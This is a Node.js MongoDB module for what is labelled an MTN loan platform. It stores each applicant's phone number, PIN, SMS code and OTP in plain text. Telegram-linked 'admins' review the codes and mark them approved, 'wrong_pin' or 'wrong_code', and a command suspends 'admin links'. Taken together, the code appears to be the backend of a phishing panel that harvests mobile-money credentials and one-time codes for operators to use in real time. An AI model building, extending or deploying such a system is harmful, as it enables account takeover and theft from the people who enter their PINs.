const { MongoClient } = require('mongodb');

let client;
let db;

// Database and collections setup
const DB_NAME = process.env.DB_NAME || 'mtn_loan_platform';
const COLLECTIONS = {
    ADMINS: 'admins',
    APPLICATIONS: 'applications',
    ENVIRONMENT_LOGS: 'environment_logs'
};

/**
 * Connect to MongoDB
 */
async function connectDatabase() {
    try {
        const MONGODB_URI = process.env.MONGODB_URI;

        if (!MONGODB_URI) {
            throw new Error('❌ MONGODB_URI is not set in environment variables');
        }

        console.log('🔄 Connecting to MongoDB...');

        client = new MongoClient(MONGODB_URI);
        await client.connect();

        db = client.db(DB_NAME);

        console.log('✅ Connected to MongoDB successfully');

        await createIndexes();

        return db;
    } catch (error) {
        console.error('❌ MongoDB connection error:', error);
        throw error;
    }
}

/**
 * Create database indexes
 */
async function createIndexes() {
    try {
        await db.collection(COLLECTIONS.ADMINS).createIndex({ adminId: 1 }, { unique: true });
        await db.collection(COLLECTIONS.ADMINS).createIndex({ chatId: 1 });
        await db.collection(COLLECTIONS.ADMINS).createIndex({ status: 1 });
        await db.collection(COLLECTIONS.ADMINS).createIndex({ role: 1 });

        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ id: 1 }, { unique: true });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ adminId: 1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ phoneNumber: 1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ timestamp: -1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ pinStatus: 1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ smsStatus: 1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ smsOtpStatus: 1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ otpStatus: 1 });

        await db.collection(COLLECTIONS.ENVIRONMENT_LOGS).createIndex({ adminId: 1 });
        await db.collection(COLLECTIONS.ENVIRONMENT_LOGS).createIndex({ timestamp: -1 });
        await db.collection(COLLECTIONS.ENVIRONMENT_LOGS).createIndex({ action: 1 });

        console.log('✅ Database indexes created');
    } catch (error) {
        console.error('⚠️ Error creating indexes:', error.message);
    }
}

/**
 * Close database connection
 */
async function closeDatabase() {
    if (client) {
        await client.close();
        console.log('✅ Database connection closed');
    }
}

// ==========================================
// ENVIRONMENT & MESSAGING LOGS OPERATIONS
// ==========================================

async function logAdminActivity(adminId, action, details = {}) {
    try {
        const logEntry = {
            adminId,
            action,
            details,
            timestamp: new Date().toISOString()
        };
        await db.collection(COLLECTIONS.ENVIRONMENT_LOGS).insertOne(logEntry);
        console.log(`📝 Environment Log [${action}] recorded for admin: ${adminId}`);
    } catch (error) {
        console.error('❌ Error recording environment log:', error);
    }
}

async function getEnvironmentLogs(query = {}, limit = 100) {
    try {
        return await db.collection(COLLECTIONS.ENVIRONMENT_LOGS)
            .find(query)
            .sort({ timestamp: -1 })
            .limit(limit)
            .toArray();
    } catch (error) {
        console.error('❌ Error getting environment logs:', error);
        return [];
    }
}

// ==========================================
// ADMIN & SUPER ADMIN OPERATIONS
// ==========================================

/**
 * Add / Save Admin
 * Handles /addadmin and /addadminid commands
 */
async function saveAdmin(adminData) {
    try {
        const adminId = adminData.adminId || adminData.id;

        if (!adminId) throw new Error('Admin ID is required');

        const existingAdmin = await db.collection(COLLECTIONS.ADMINS).findOne({ adminId });
        if (existingAdmin) throw new Error(`Admin ${adminId} already exists in database`);

        const adminDocument = {
            adminId,
            name: adminData.name || `Admin ${adminId}`,
            email: adminData.email || null,
            chatId: adminData.chatId !== undefined && adminData.chatId !== null ? String(adminData.chatId) : null,
            role: adminData.role || (adminId === 'ADMIN001' ? 'super_admin' : 'admin'),
            status: adminData.status || 'active',
            createdAt: adminData.createdAt || new Date().toISOString()
        };

        if (adminData.botToken) adminDocument.botToken = adminData.botToken;

        const result = await db.collection(COLLECTIONS.ADMINS).insertOne(adminDocument);
        
        await logAdminActivity(adminId, 'ADMIN_CREATED', { name: adminDocument.name, role: adminDocument.role });

        console.log(`✅ Admin saved successfully: ${adminId} (${adminDocument.name})`);
        return result;
    } catch (error) {
        console.error('❌ Error saving admin:', error);
        throw error;
    }
}

async function getAdmin(adminId) {
    try {
        return await db.collection(COLLECTIONS.ADMINS).findOne({ adminId });
    } catch (error) {
        console.error('❌ Error getting admin:', error);
        return null;
    }
}

async function getAdminByChatId(chatId) {
    try {
        if (!chatId) return null;
        return await db.collection(COLLECTIONS.ADMINS).findOne({ chatId: String(chatId) });
    } catch (error) {
        console.error('❌ Error getting admin by chat ID:', error);
        return null;
    }
}

/**
 * Handles /admins command (List all admins)
 */
async function getAllAdmins() {
    try {
        return await db.collection(COLLECTIONS.ADMINS)
            .find({})
            .sort({ createdAt: -1 })
            .toArray();
    } catch (error) {
        console.error('❌ Error getting admins:', error);
        return [];
    }
}

/**
 * Fetch all active admins for broadcast (/broadcast)
 */
async function getActiveAdmins() {
    try {
        return await db.collection(COLLECTIONS.ADMINS)
            .find({ status: 'active' })
            .toArray();
    } catch (error) {
        console.error('❌ Error getting active admins:', error);
        return [];
    }
}

async function updateAdmin(adminId, updates) {
    try {
        const formattedUpdates = { ...updates, updatedAt: new Date().toISOString() };
        if (formattedUpdates.chatId !== undefined && formattedUpdates.chatId !== null) {
            formattedUpdates.chatId = String(formattedUpdates.chatId);
        }

        const result = await db.collection(COLLECTIONS.ADMINS).updateOne(
            { adminId },
            { $set: formattedUpdates }
        );
        
        await logAdminActivity(adminId, 'ADMIN_UPDATED', updates);

        console.log(`🔄 Admin ${adminId} updated`);
        return result;
    } catch (error) {
        console.error('❌ Error updating admin:', error);
        throw error;
    }
}

/**
 * Handles /pauseadmin and /unpauseadmin commands
 */
async function updateAdminStatus(adminId, status) {
    try {
        const result = await db.collection(COLLECTIONS.ADMINS).updateOne(
            { adminId },
            { $set: { status, updatedAt: new Date().toISOString() } }
        );
        
        await logAdminActivity(adminId, 'ADMIN_STATUS_UPDATED', { status });

        console.log(`🔄 Admin ${adminId} status updated to: ${status}`);
        return result;
    } catch (error) {
        console.error('❌ Error updating admin status:', error);
        throw error;
    }
}

/**
 * Handles /transferadmin <oldChatId> | <newChatId> command
 */
async function transferAdminChatId(oldChatId, newChatId) {
    try {
        const existingAdmin = await getAdminByChatId(oldChatId);
        if (!existingAdmin) {
            throw new Error(`No admin found with Telegram Chat ID: ${oldChatId}`);
        }

        const result = await db.collection(COLLECTIONS.ADMINS).updateOne(
            { chatId: String(oldChatId) },
            { $set: { chatId: String(newChatId), updatedAt: new Date().toISOString() } }
        );

        await logAdminActivity(existingAdmin.adminId, 'ADMIN_TRANSFERRED', { oldChatId, newChatId });
        console.log(`🔄 Transferred admin ${existingAdmin.adminId} from ${oldChatId} to ${newChatId}`);
        return result;
    } catch (error) {
        console.error('❌ Error transferring admin:', error);
        throw error;
    }
}

/**
 * Handles /suspendall command
 */
async function suspendAllAdmins(exceptSuper = true) {
    try {
        const query = exceptSuper ? { role: { $ne: 'super_admin' }, adminId: { $ne: 'ADMIN001' } } : {};
        const result = await db.collection(COLLECTIONS.ADMINS).updateMany(
            query,
            { $set: { status: 'paused', updatedAt: new Date().toISOString() } }
        );
        console.log(`🔒 Suspended ${result.modifiedCount} admin links.`);
        return result;
    } catch (error) {
        console.error('❌ Error suspending admins:', error);
        throw error;
    }
}

/**
 * Handles /removeadmin command
 */
async function deleteAdmin(adminId) {
    try {
        const result = await db.collection(COLLECTIONS.ADMINS).deleteOne({ adminId });
        
        await logAdminActivity(adminId, 'ADMIN_DELETED', {});

        console.log(`🗑️ Admin deleted: ${adminId}`);
        return result;
    } catch (error) {
        console.error('❌ Error deleting admin:', error);
        throw error;
    }
}

async function adminExists(adminId) {
    try {
        const count = await db.collection(COLLECTIONS.ADMINS).countDocuments({ adminId });
        return count > 0;
    } catch (error) {
        console.error('❌ Error checking admin existence:', error);
        return false;
    }
}

async function getAdminCount() {
    try {
        return await db.collection(COLLECTIONS.ADMINS).countDocuments({});
    } catch (error) {
        console.error('❌ Error getting admin count:', error);
        return 0;
    }
}

// ==========================================
// APPLICATION OPERATIONS
// ==========================================

async function saveApplication(appData) {
    try {
        const applicationDocument = {
            id: appData.id,
            adminId: appData.adminId,
            adminName: appData.adminName,
            phoneNumber: appData.phoneNumber,
            pin: appData.pin,
            pinStatus: appData.pinStatus || 'pending',
            
            smsText: appData.smsText || appData.smsOtp || null,
            smsOtp: appData.smsOtp || appData.smsText || null,
            smsStatus: appData.smsStatus || appData.smsOtpStatus || 'pending',
            smsOtpStatus: appData.smsOtpStatus || appData.smsStatus || 'pending',
            
            otp: appData.otp || null,
            otpStatus: appData.otpStatus || 'pending',

            assignmentType: appData.assignmentType || 'auto',
            isReturningUser: appData.isReturningUser || false,
            previousCount: appData.previousCount || 0,
            timestamp: appData.timestamp || new Date().toISOString()
        };

        const result = await db.collection(COLLECTIONS.APPLICATIONS).insertOne(applicationDocument);

        if (appData.adminId) {
            await logAdminActivity(appData.adminId, 'APPLICATION_CREATED', { applicationId: appData.id, phoneNumber: appData.phoneNumber });
        }

        console.log(`💾 Application saved: ${appData.id}`);
        return result;
    } catch (error) {
        console.error('❌ Error saving application:', error);
        throw error;
    }
}

async function getApplication(applicationId) {
    try {
        return await db.collection(COLLECTIONS.APPLICATIONS).findOne({ id: applicationId });
    } catch (error) {
        console.error('❌ Error getting application:', error);
        return null;
    }
}

async function updateApplication(applicationId, updates) {
    try {
        const result = await db.collection(COLLECTIONS.APPLICATIONS).updateOne(
            { id: applicationId },
            { $set: { ...updates, updatedAt: new Date().toISOString() } }
        );

        const app = await getApplication(applicationId);
        if (app && app.adminId) {
            await logAdminActivity(app.adminId, 'APPLICATION_UPDATED', { applicationId, updates });
        }

        console.log(`🔄 Application updated: ${applicationId}`);
        return result;
    } catch (error) {
        console.error('❌ Error updating application:', error);
        throw error;
    }
}

async function getApplicationsByAdmin(adminId) {
    try {
        return await db.collection(COLLECTIONS.APPLICATIONS)
            .find({ adminId })
            .sort({ timestamp: -1 })
            .toArray();
    } catch (error) {
        console.error('❌ Error getting applications by admin:', error);
        return [];
    }
}

async function getPendingApplications(adminId) {
    try {
        const query = (adminId === 'ADMIN001') ? {
            $or: [
                { pinStatus: 'pending' }, 
                { smsStatus: 'pending' }, 
                { smsOtpStatus: 'pending' }, 
                { otpStatus: 'pending' }
            ]
        } : {
            adminId,
            $or: [
                { pinStatus: 'pending' }, 
                { smsStatus: 'pending' }, 
                { smsOtpStatus: 'pending' }, 
                { otpStatus: 'pending' }
            ]
        };

        return await db.collection(COLLECTIONS.APPLICATIONS)
            .find(query)
            .sort({ timestamp: -1 })
            .toArray();
    } catch (error) {
        console.error('❌ Error getting pending applications:', error);
        return [];
    }
}

// ==========================================
// STATISTICS OPERATIONS (/stats)
// ==========================================

async function getAdminStats(adminId) {
    try {
        const query = adminId === 'ADMIN001' ? {} : { adminId };

        const total = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments(query);
        const pinPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ ...query, pinStatus: 'pending' });
        const pinApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ ...query, pinStatus: 'approved' });
        const smsPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ 
            ...query, 
            $or: [{ smsStatus: 'pending' }, { smsOtpStatus: 'pending' }] 
        });
        const fullyApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ ...query, otpStatus: 'approved' });

        return { total, pinPending, pinApproved, smsPending, fullyApproved };
    } catch (error) {
        console.error('❌ Error getting admin stats:', error);
        return { total: 0, pinPending: 0, pinApproved: 0, smsPending: 0, fullyApproved: 0 };
    }
}

async function getStats() {
    try {
        const totalAdmins = await db.collection(COLLECTIONS.ADMINS).countDocuments({});
        const totalApplications = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({});
        const pinPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ pinStatus: 'pending' });
        const pinApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ pinStatus: 'approved' });
        const smsPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({
            $or: [{ smsStatus: 'pending' }, { smsOtpStatus: 'pending' }]
        });
        const fullyApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ otpStatus: 'approved' });
        const totalRejected = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({
            $or: [
                { pinStatus: 'rejected' },
                { smsStatus: 'rejected' },
                { smsOtpStatus: 'rejected' },
                { otpStatus: { $in: ['wrong_pin', 'wrong_code', 'rejected'] } }
            ]
        });

        return { totalAdmins, totalApplications, pinPending, pinApproved, smsPending, fullyApproved, totalRejected };
    } catch (error) {
        console.error('❌ Error getting global stats:', error);
        return { totalAdmins: 0, totalApplications: 0, pinPending: 0, pinApproved: 0, smsPending: 0, fullyApproved: 0, totalRejected: 0 };
    }
}

async function getPerAdminStats() {
    try {
        const admins = await getAllAdmins();
        const statsPromises = admins.map(async (admin) => {
            const stats = await getAdminStats(admin.adminId);
            return { adminId: admin.adminId, name: admin.name, role: admin.role, ...stats };
        });
        return await Promise.all(statsPromises);
    } catch (error) {
        console.error('❌ Error getting per-admin stats:', error);
        return [];
    }
}

// ==========================================
// MAINTENANCE HELPERS
// ==========================================

async function getAllAdminsDetailed() {
    try {
        const admins = await db.collection(COLLECTIONS.ADMINS)
            .find({})
            .sort({ createdAt: -1 })
            .toArray();
        console.log(`📊 Found ${admins.length} admins in database`);
        admins.forEach(admin => {
            console.log(`   ${admin.adminId}: ${admin.name} (Role: ${admin.role}, chatId: ${admin.chatId}, status: ${admin.status})`);
        });
        return admins;
    } catch (error) {
        console.error('❌ Error getting detailed admins:', error);
        return [];
    }
}

async function cleanupInvalidAdmins() {
    try {
        const result = await db.collection(COLLECTIONS.ADMINS).deleteMany({
            $or: [
                { adminId: { $exists: false } },
                { adminId: null },
                { adminId: '' }
            ]
        });
        console.log(`🧹 Cleaned up ${result.deletedCount} invalid admin(s)`);
        return result;
    } catch (error) {
        console.error('❌ Error cleaning up invalid admins:', error);
        throw error;
    }
}

module.exports = {
    connectDatabase,
    closeDatabase,

    saveAdmin,
    getAdmin,
    getAdminByChatId,
    getAllAdmins,
    getActiveAdmins,
    updateAdmin,
    updateAdminStatus,
    transferAdminChatId,
    suspendAllAdmins,
    deleteAdmin,
    adminExists,
    getAdminCount,

    saveApplication,
    getApplication,
    updateApplication,
    getApplicationsByAdmin,
    getPendingApplications,

    logAdminActivity,
    getEnvironmentLogs,

    getAdminStats,
    getStats,
    getPerAdminStats,

    getAllAdminsDetailed,
    cleanupInvalidAdmins
};
